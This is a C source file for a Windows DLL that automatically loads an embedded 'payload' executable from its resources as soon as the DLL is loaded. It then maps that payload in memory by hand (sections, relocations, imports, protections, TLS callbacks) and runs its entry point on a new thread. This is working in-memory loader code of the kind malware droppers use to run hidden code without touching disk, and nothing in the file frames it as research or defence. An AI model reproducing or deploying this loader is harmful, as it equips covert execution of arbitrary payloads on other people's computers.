#include <pch.h>
#include <windows.h>
#include <stdio.h>
#include <strsafe.h>
#include <winternl.h>

#define DLL_EXPORT __declspec(dllexport)

typedef UINT_PTR UPTR;
typedef BOOL(WINAPI* DllEntryProc)(HINSTANCE, DWORD, LPVOID);
typedef VOID(NTAPI* PIMAGE_TLS_CALLBACK)(LPVOID, DWORD, LPVOID);

BOOL IsValidPE(LPVOID pModuleBase) {
    __try {
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            OutputDebugStringA("Invalid DOS header signature.\n");
            return FALSE;
        }

        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
            OutputDebugStringA("Invalid NT headers signature.\n");
            return FALSE;
        }

        return TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        OutputDebugStringA("Exception while validating PE.\n");
        return FALSE;
    }
}

LPVOID AllocateMemoryForReassembly(SIZE_T size) {
    LPVOID pMemory = VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!pMemory) {
        OutputDebugStringA("Memory allocation failed.\n");
        return NULL;
    }
    return pMemory;
}

BOOL CopySections(LPVOID pOriginalImage, LPVOID pNewImageBase, PIMAGE_NT_HEADERS pNtHeaders) {
    __try {
        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
        for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i, ++pSectionHeader) {
            if (pSectionHeader->SizeOfRawData > 0) {
                BYTE* pDest = (BYTE*)pNewImageBase + pSectionHeader->VirtualAddress;
                BYTE* pSrc = (BYTE*)pOriginalImage + pSectionHeader->PointerToRawData;

                if (pSectionHeader->VirtualAddress + pSectionHeader->SizeOfRawData > pNtHeaders->OptionalHeader.SizeOfImage) {
                    OutputDebugStringA("Section exceeds image size.\n");
                    return FALSE;
                }

                memcpy(pDest, pSrc, pSectionHeader->SizeOfRawData);
            }
        }
        OutputDebugStringA("All sections copied successfully.\n");
        return TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        OutputDebugStringA("Exception while copying sections.\n");
        return FALSE;
    }
}

BOOL ApplySectionProtections(PIMAGE_NT_HEADERS pNtHeaders, BYTE* pNewImageBase) {
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i, ++pSectionHeader) {
        DWORD protection = PAGE_READONLY;
        DWORD characteristics = pSectionHeader->Characteristics;

        if (characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (characteristics & IMAGE_SCN_MEM_WRITE) {
                protection = PAGE_EXECUTE_READWRITE;
            }
            else {
                protection = PAGE_EXECUTE_READ;
            }
        }
        else if (characteristics & IMAGE_SCN_MEM_WRITE) {
            protection = PAGE_READWRITE;
        }

        DWORD oldProtect;
        if (pSectionHeader->Misc.VirtualSize > 0) {
            if (!VirtualProtect((BYTE*)pNewImageBase + pSectionHeader->VirtualAddress,
                pSectionHeader->Misc.VirtualSize,
                protection,
                &oldProtect)) {
                char errorMsg[256];
                StringCchPrintfA(errorMsg, sizeof(errorMsg),
                    "Failed to set protection for section %s. Error: %d\n",
                    pSectionHeader->Name, GetLastError());
                OutputDebugStringA(errorMsg);
            }
        }
    }

    OutputDebugStringA("Section protections applied.\n");
    return TRUE;
}

BOOL HandleRelocations(PIMAGE_NT_HEADERS pNtHeaders, BYTE* pNewImageBase, UPTR oldBase, UPTR newBase) {
    __try {
        PIMAGE_DATA_DIRECTORY pDataDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (pDataDir->VirtualAddress == 0 || pDataDir->Size == 0) {
            OutputDebugStringA("No relocations to process.\n");
            return TRUE;
        }

        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pNewImageBase + pDataDir->VirtualAddress);
        PIMAGE_BASE_RELOCATION pRelocEnd = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pDataDir->Size);

        UPTR delta = newBase - oldBase;

        while (pReloc < pRelocEnd && pReloc->SizeOfBlock > 0) {
            BYTE* pBlockData = pNewImageBase + pReloc->VirtualAddress;
            DWORD numEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

            for (DWORD i = 0; i < numEntries; ++i) {
                WORD relocEntry = ((WORD*)(pReloc + 1))[i];
                if (relocEntry == 0) continue;

                WORD type = relocEntry >> 12;
                WORD offset = relocEntry & 0xFFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    *(UPTR*)(pBlockData + offset) += delta;
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    *(DWORD*)(pBlockData + offset) += (DWORD)delta;
                }
            }
            pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
        }
        OutputDebugStringA("Relocations handled successfully.\n");
        return TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        OutputDebugStringA("Exception while handling relocations.\n");
        return FALSE;
    }
}

BOOL HandleImports(PIMAGE_NT_HEADERS pNtHeaders, BYTE* pNewImageBase) {
    __try {
        PIMAGE_DATA_DIRECTORY pDataDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (pDataDir->VirtualAddress == 0 || pDataDir->Size == 0) {
            OutputDebugStringA("No imports to process.\n");
            return TRUE;
        }

        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pNewImageBase + pDataDir->VirtualAddress);

        for (; pImportDesc->Name != 0; ++pImportDesc) {
            char* szDllName = (char*)(pNewImageBase + pImportDesc->Name);
            HMODULE hImportedDll = LoadLibraryA(szDllName);

            if (!hImportedDll) {
                char errorMsg[256];
                StringCchPrintfA(errorMsg, sizeof(errorMsg), "Failed to load imported DLL: %s\n", szDllName);
                OutputDebugStringA(errorMsg);
                return FALSE;
            }

            PIMAGE_THUNK_DATA pThunkIAT = (PIMAGE_THUNK_DATA)(pNewImageBase + pImportDesc->FirstThunk);
            PIMAGE_THUNK_DATA pThunkOFT = NULL;

            if (pImportDesc->OriginalFirstThunk != 0) {
                pThunkOFT = (PIMAGE_THUNK_DATA)(pNewImageBase + pImportDesc->OriginalFirstThunk);
            }
            else {
                pThunkOFT = pThunkIAT;
            }

            for (; pThunkOFT->u1.Function != 0; ++pThunkIAT, ++pThunkOFT) {
                if (IMAGE_SNAP_BY_ORDINAL(pThunkOFT->u1.Ordinal)) {
                    pThunkIAT->u1.Function = (UPTR)GetProcAddress(hImportedDll,
                        (LPCSTR)IMAGE_ORDINAL(pThunkOFT->u1.Ordinal));
                }
                else {
                    PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)(pNewImageBase + pThunkOFT->u1.AddressOfData);
                    pThunkIAT->u1.Function = (UPTR)GetProcAddress(hImportedDll, pImportName->Name);
                }

                if (!pThunkIAT->u1.Function) {
                    OutputDebugStringA("Failed to resolve import function.\n");
                    return FALSE;
                }
            }
        }
        OutputDebugStringA("Imports handled successfully.\n");
        return TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        OutputDebugStringA("Exception while handling imports.\n");
        return FALSE;
    }
}

BOOL ExecuteTLSCallbacks(PIMAGE_NT_HEADERS pNtHeaders, BYTE* pNewImageBase, DWORD dwReason) {
    __try {
        if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0) {
            return TRUE;
        }

        PIMAGE_TLS_DIRECTORY64 pTLSDir = (PIMAGE_TLS_DIRECTORY64)(pNewImageBase +
            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);

        if (pTLSDir && pTLSDir->AddressOfCallBacks != 0) {

            PIMAGE_TLS_CALLBACK* pTLSCallbacks = (PIMAGE_TLS_CALLBACK*)(pTLSDir->AddressOfCallBacks);

            while (*pTLSCallbacks) {
                (*pTLSCallbacks)((LPVOID)pNewImageBase, dwReason, NULL);
                pTLSCallbacks++;
            }
            OutputDebugStringA("TLS callbacks executed successfully.\n");
        }
        return TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        OutputDebugStringA("Exception while executing TLS callbacks.\n");
        return FALSE;
    }
}

DWORD WINAPI PerformReassembly(LPVOID pPayload) {
    if (!pPayload) {
        OutputDebugStringA("No payload provided.\n");
        return FALSE;
    }

    if (!IsValidPE(pPayload)) {
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pPayload;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pPayload + pDosHeader->e_lfanew);
    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    UPTR preferredBase = pNtHeaders->OptionalHeader.ImageBase;

    LPVOID pNewImageBase = AllocateMemoryForReassembly(imageSize);
    if (!pNewImageBase) {
        return FALSE;
    }

    SIZE_T headersSize = pNtHeaders->OptionalHeader.SizeOfHeaders;
    memcpy(pNewImageBase, pPayload, headersSize);

    if (!CopySections(pPayload, pNewImageBase, pNtHeaders)) {
        VirtualFree(pNewImageBase, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!HandleRelocations(pNtHeaders, (BYTE*)pNewImageBase, preferredBase, (UPTR)pNewImageBase)) {
        VirtualFree(pNewImageBase, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!HandleImports(pNtHeaders, (BYTE*)pNewImageBase)) {
        VirtualFree(pNewImageBase, 0, MEM_RELEASE);
        return FALSE;
    }

    ApplySectionProtections(pNtHeaders, (BYTE*)pNewImageBase);

    ExecuteTLSCallbacks(pNtHeaders, (BYTE*)pNewImageBase, DLL_PROCESS_ATTACH);

    DWORD entryPointRVA = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    if (entryPointRVA != 0) {
        DllEntryProc pDllMain = (DllEntryProc)((BYTE*)pNewImageBase + entryPointRVA);

        __try {
            OutputDebugStringA("Calling DllMain...\n");
            BOOL result = pDllMain((HINSTANCE)pNewImageBase, DLL_PROCESS_ATTACH, NULL);

            if (result) {
                OutputDebugStringA("PE reassembly and execution completed successfully.\n");
            }
            else {
                OutputDebugStringA("DllMain returned FALSE.\n");
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            char errorMsg[256];
            StringCchPrintfA(errorMsg, sizeof(errorMsg),
                "Exception while calling DllMain. Exception code: 0x%X\n",
                GetExceptionCode());
            OutputDebugStringA(errorMsg);
            return FALSE;
        }
    }

    return TRUE;
}

LPVOID GetPayloadFromResource(HMODULE hModule) {

    HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(101), RT_RCDATA);
    if (!hResource) {
        OutputDebugStringA("Failed to find payload resource.\n");
        return NULL;
    }

    HGLOBAL hLoadedResource = LoadResource(hModule, hResource);
    if (!hLoadedResource) {
        OutputDebugStringA("Failed to load payload resource.\n");
        return NULL;
    }

    LPVOID pPayload = LockResource(hLoadedResource);
    if (!pPayload) {
        OutputDebugStringA("Failed to lock payload resource.\n");
        return NULL;
    }

    OutputDebugStringA("Payload loaded from resource successfully.\n");
    return pPayload;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        LPVOID pPayload = GetPayloadFromResource(hModule);

        if (pPayload) {
            OutputDebugStringA("Creating thread to perform PE reassembly...\n");

            HANDLE hThread = CreateThread(NULL, 0, PerformReassembly, pPayload, 0, NULL);
            if (hThread) {
                CloseHandle(hThread);
                OutputDebugStringA("Reassembly thread created successfully.\n");
            }
            else {
                OutputDebugStringA("Failed to create reassembly thread.\n");
            }
        }
        else {
            OutputDebugStringA("Warning: No payload available for reassembly.\n");
        }
    }
    return TRUE;
}